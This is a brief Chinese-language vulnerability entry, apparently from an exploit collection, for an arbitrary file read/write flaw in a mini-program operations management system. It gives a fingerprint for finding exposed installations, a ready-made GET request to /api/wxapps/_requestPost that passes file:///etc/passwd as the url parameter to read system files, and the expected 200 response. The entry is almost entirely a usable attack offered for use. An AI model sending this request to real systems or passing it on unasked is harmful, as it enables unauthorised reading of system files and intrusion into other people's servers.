# 万能小程序运营管理系统_requestPost任意文件读取漏洞

万能小程序运营管理系统_requestPost ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/com/css/head_foot.css"`
- **请求**：`GET /api/wxapps/_requestPost?data=1&url=file:///etc/passwd HTTP/1.1`
- **响应特征**：200